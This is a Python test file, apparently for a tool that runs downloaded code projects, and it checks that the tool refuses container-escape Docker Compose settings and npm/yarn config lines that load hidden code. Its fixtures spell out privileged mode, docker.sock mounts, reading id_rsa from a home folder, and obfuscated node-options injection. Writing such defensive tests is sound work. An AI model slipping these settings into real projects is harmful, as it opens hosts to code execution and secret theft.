@pytest.mark.parametrize("config", [
    _svc(ipc="host"), _svc(ipc="container:abc"), _svc(pid="host"), _svc(pid="container:x"),
    _svc(userns_mode="host"), _svc(cap_add=["NET_ADMIN"]), _svc(privileged=True),
    _svc(devices=[{"source": "/dev/sda", "target": "/dev/sda", "permissions": "rwm"}]),
    _svc(security_opt=["seccomp:unconfined"]), _svc(security_opt=["apparmor:unconfined"]),
    _svc(security_opt=["seccomp=unconfined"]), _svc(security_opt=["label:disable"]),
    _svc(security_opt=["systempaths=unconfined"]),
    _svc(network_mode="HOST"), _svc(network_mode="container:other"),
    _svc(network_mode="service:not-in-project"),
    _svc(volumes_from=["container:other"]),
    _svc(cgroup="host"), _svc(uts="host"), _svc(cgroup_parent="/"), _svc(label_file="x"),
    _svc(device_cgroup_rules=["a *:* rwm"]), _svc(runtime="kata"),
    _svc(logging={"driver": "syslog", "options": {"syslog-address": "udp://1.2.3.4"}}),
    _svc(volumes=[{"type": "npipe", "source": r"\\.\pipe\dockerDesktopLinuxEngine",
                   "target": r"\\.\pipe\x"}]),
    _svc(volumes=[{"type": "bind", "source": "/var/run/docker.sock", "target": "/s"}]),
    _svc(deploy={"resources": {"reservations": {"devices": [
        {"capabilities": ["gpu", "something"]}]}}}),
    {"services": {"a": {}}, "include": ["../other.yml"]},
    {"services": {"a": {}}, "networks": {"n": {"external": True, "name": "host"}}},
    {"services": {"a": {}}, "networks": {"n": {"driver": "macvlan"}}},
    {"services": {"a": {}}, "networks": {"n": {"driver_opts": {"parent": "eth0"}}}},
    {"services": {"a": {}}, "volumes": {"v": {"external": True}}},
    {"services": {"a": {}}, "volumes": {"v": {"driver": "local", "driver_opts": {
        "type": "none", "o": "bind", "device": "C:\\"}}}},
    {"services": {"a": {}}, "volumes": {"v": {"driver_opts": {"type": "nfs",
                                                              "o": "addr=10.0.0.2",
                                                              "device": ":/x"}}}},
    {"services": {"a": {}}, "volumes": {"v": {"driver_opts": {"type": "tmpfs",
                                                              "device": "/home",
                                                              "o": "bind"}}}},
    {"services": {"a": {}}, "volumes": {"v": {"driver": "rclone"}}},
], ids=lambda c: json.dumps(c)[:60])
def test_compose_refuses_what_reaches_past_the_project(tmp_path, config):
    root = str(tmp_path / "app")
    os.makedirs(root)
    assert run_here.compose_problems(config, root), config


def test_compose_refuses_files_and_folders_from_outside_the_project(tmp_path):
    root = str(tmp_path / "app")
    os.makedirs(root)
    home = str(tmp_path / "home")
    for config in (
            {"services": {"a": {}}, "secrets": {"s": {"file": os.path.join(home, "id_rsa")}}},
            {"services": {"a": {}}, "configs": {"c": {"file": os.path.join(home, ".gitconfig")}}},
            {"services": {"a": {}}, "secrets": {"s": {"external": True}}},
            _svc(build={"context": home}),
            _svc(build=home),
            _svc(build={"context": root, "dockerfile": os.path.join(home, "Dockerfile")}),
            _svc(build={"context": root, "dockerfile": "../home/Dockerfile"}),
            _svc(build={"context": root, "additional_contexts": {"h": home}}),
            _svc(build={"context": root, "ssh": ["default"]}),
            _svc(build={"context": root, "network": "host"}),
            _svc(env_file=[{"path": os.path.join(home, "secrets.env")}]),
            _svc(env_file=[os.path.join(home, "secrets.env")]),
            _svc(volumes=[{"type": "bind", "source": home, "target": "/h"}])):
        assert run_here.compose_problems(config, root), config


def test_compose_is_read_without_inlining_its_settings_files(tmp_path):
    src = str(tmp_path / "p")
    sup.write(src, "compose.yaml", "services:\n  web:\n    build: .\n    ports:\n      - \"8080:80\"\n")
    plan = run_here.detect(src, port=1)
    assert plan["steps"][0]["args"] == ["compose", "-f", "compose.yaml", "config",
                                        "--no-env-resolution", "--format", "json"]


# -- a project's own npm and yarn settings ------------------
# What runs is what the card shows and the fingerprint covers: a project's
# .npmrc must never load code the card does not show.

NPM_SERVER = ("require('http').createServer((q,r)=>r.end('hi'))"
              ".listen(Number(process.env.PORT), process.env.HOST);\n")


def _npm_tree(extra: dict):
    def make(root: str) -> str:
        sup.write(root, "LICENSE", sup.MIT_TEXT)
        sup.write(root, "README.md", "# P\n")
        sup.write(root, "src/lib.js", "export const x = 1;\n" * 1500)
        sup.write(root, "package.json", json.dumps({"name": "p",
                                                    "scripts": {"start": "node server.js"}}))
        sup.write(root, "server.js", NPM_SERVER)
        for rel, text in extra.items():
            sup.write(root, rel, text)
        return root
    return make


def _hidden_js(mark) -> str:
    return "require('fs').writeFileSync(%s, 'hidden ran');\n" % json.dumps(str(mark))


@pytest.mark.parametrize("text", [
    "node-options=--require ./hidden.js\n",
    '"node-options" = --require ./hidden.js\n',
    "NODE_OPTIONS=--require ./hidden.js\n",
    "﻿node_options = --require ./hidden.js\n",
    '"node\\u002doptions"=--require ./hidden.js\n',
    "node-${HOST}options=--require ./hidden.js\n",
    "script-shell=./evil.cmd\n",
    "shell=./evil.cmd\n",
    "globalconfig=./more.npmrc\n",
    "workspaces=true\n",
    "git=./fake-git.cmd\n",
])
def test_npmrc_settings_that_load_code_are_refused(tmp_path, text):
    src = _npm_tree({".npmrc": text})(str(tmp_path / "p"))
    plan = run_here.detect(src, port=5555)
    assert plan["how"] == "" and ".npmrc" in plan["why_not"], plan


@pytest.mark.parametrize("name,text", [
    (".yarnrc.yml", "yarnPath: ./hidden.cjs\n"),
    (".yarnrc.yml", "plugins:\n  - path: ./hidden.cjs\n"),
    (".yarnrc.yml", "injectEnvironmentFiles:\n  - .env.yarn\n"),
    (".yarnrc", 'yarn-path "./hidden.js"\n'),
])
def test_yarn_settings_that_load_code_are_refused(tmp_path, name, text):
    src = _npm_tree({name: text})(str(tmp_path / "p"))
    plan = run_here.detect(src, port=5555)
    assert plan["how"] == "" and name in plan["why_not"], plan


def test_other_npm_settings_are_shown_and_fingerprinted_secrets_hidden(tmp_path):
    src = _npm_tree({".npmrc": "engine-strict=true\n; a note\n"
                               "//registry.npmjs.org/:_authToken=abc-secret-123\n"})(
        str(tmp_path / "p"))
    plan = run_here.detect(src, port=5555)
    assert plan["how"] == "node_server" and set(plan["config_files"]) == {".npmrc"}
    shown = " ".join(plan["config_settings"])
    assert "engine-strict=true" in shown and "(hidden)" in shown
    assert "abc-secret-123" not in shown
    before = run_here.plan_sha(plan)
    sup.write(src, ".npmrc", "engine-strict=false\n")
    assert run_here.plan_sha(run_here.detect(src, port=5555)) != before
    # No settings file: still recorded (empty), so one added later is caught.
    os.remove(os.path.join(src, ".npmrc"))
    assert run_here.detect(src, port=5555)["config_files"] == {}


@pytest.mark.skipif(not HAS_NODE, reason="Node.js is not on this computer")
def test_project_npmrc_node_options_is_refused_and_nothing_runs(world, tmp_path):
    """The repro: node-options in a project's .npmrc."""
    mark = tmp_path / "hidden_ran.txt"
    h = world(_npm_tree({".npmrc": "node-options=--require ./hidden.js\n",
                         "hidden.js": _hidden_js(mark)}),
              mode="other", name="npmrc-app", item="apps_code:github:someone/npmrcapp")
    out = apply.prepare_code_project(h["item"], sup.Ctx())
    host = out["card"]["host"]
    assert host["how"] == "" and "node-options" in host["why_not"], host
    assert "node-options" in "\n".join(out["card"]["lines"])
    got = apply.finish_prepared(out["integration_id"], code_sha=out["card"]["code_sha"],
                                host_sha=out["card"].get("host_sha", ""))
    assert got.get("status") != "added", got
    time.sleep(1)
    assert not mark.exists(), "the project's .npmrc ran hidden code"


@pytest.mark.skipif(not HAS_NODE, reason="Node.js is not on this computer")
def test_npm_settings_change_after_yes_runs_nothing(world, tmp_path):
    mark = tmp_path / "hidden_ran.txt"
    h = world(_npm_tree({".npmrc": "engine-strict=true\n", "hidden.js": _hidden_js(mark)}),
              mode="other", name="npmrc-ok", item="apps_code:github:someone/npmrcok")
    out, got = _prepare_and_yes(h)
    iid = out["integration_id"]
    assert got["status"] == "added", got
    text = "\n".join(out["card"]["lines"])
    assert "Its own settings file" in text and "engine-strict=true" in text
    try:
        assert run_here.wait_ready(iid, 60)["state"] == "running", run_here.logs(iid)
        run_here.stop(iid)
        npmrc = os.path.join(run_here.app_dir(iid), ".npmrc")
        for changed in ("engine-strict=true\nnode-options=--require ./hidden.js\n",
                        "engine-strict=false\n", None):
            if changed is None:
                os.remove(npmrc)
            else:
                sup.write(run_here.app_dir(iid), ".npmrc", changed)
            r = run_here.start(iid)
            assert r["ok"] is False and r["code"] == "changed", r
        for name in (".yarnrc", ".yarnrc.yml"):        # a yarn file added after the yes
            sup.write(run_here.app_dir(iid), ".npmrc", "engine-strict=true\n")
            sup.write(run_here.app_dir(iid), name, "nodeLinker: node-modules\n")
            r = run_here.start(iid)
            assert r["ok"] is False and r["code"] == "changed", r
            os.remove(os.path.join(run_here.app_dir(iid), name))
        assert run_here.start(iid)["ok"] is True        # back as the yes saw it
        assert run_here.wait_ready(iid, 60)["state"] == "running"
    finally:
        run_here.stop(iid)
    assert not mark.exists(), "hidden code ran"


@pytest.mark.skipif(not HAS_NODE, reason="Node.js is not on this computer")
def test_npm_runs_with_empty_node_options_even_past_the_settings_check(world, tmp_path,
                                                                      monkeypatch):
    """Belt and braces: even with the settings check skipped, npm's own
    command line empties node-options, so the .npmrc line loads nothing."""
    mark = tmp_path / "hidden_ran.txt"
    h = world(_npm_tree({"hidden.js": _hidden_js(mark)}), mode="other", name="belt",
              item="apps_code:github:someone/belt")
    out, got = _prepare_and_yes(h)
    iid = out["integration_id"]
    try:
        assert run_here.wait_ready(iid, 60)["state"] == "running", run_here.logs(iid)
        run_here.stop(iid)
        sup.write(run_here.app_dir(iid), ".npmrc", "node-options=--require ./hidden.js\n")
        monkeypatch.setattr(run_here, "_check_node_config", lambda iid, plan: None)
        assert run_here.start(iid)["ok"] is True
        assert run_here.wait_ready(iid, 60)["state"] == "running", run_here.logs(iid)
        time.sleep(1)
    finally:
        run_here.stop(iid)
    assert not mark.exists(), "npm passed the project's node-options to node"


def test_pip_runs_isolated_so_a_project_pip_folder_never_runs(tmp_path, monkeypatch):
    """``python -m pip`` from the project's folder would import a ``pip``
    folder the project ships; pip runs with ``-I`` so it never does."""
    import subprocess
    folder = tmp_path / "app"
    mark = tmp_path / "fake_pip_ran.txt"
    sup.write(str(folder), "pip/__init__.py", "")
    sup.write(str(folder), "pip/__main__.py",
              "open(%s, 'w').write('x')\n" % json.dumps(str(mark)))
    monkeypatch.setattr(run_here, "_venv_bin", lambda iid, name: sys.executable)
    monkeypatch.setattr(run_here, "venv_dir", lambda iid: str(tmp_path / "venv"))
    monkeypatch.setattr(run_here, "project_name", lambda iid: "bb-x")
    argv = run_here._argv("x", {"tool": "pip", "args": ["--version"]}, {})  # noqa: SLF001
    assert argv[1:4] == ["-I", "-m", "pip"]
    done = subprocess.run(argv, cwd=str(folder), capture_output=True, text=True, timeout=60)
    assert done.returncode == 0 and "pip" in done.stdout, done
    assert not mark.exists(), "a pip folder in the project ran as pip"
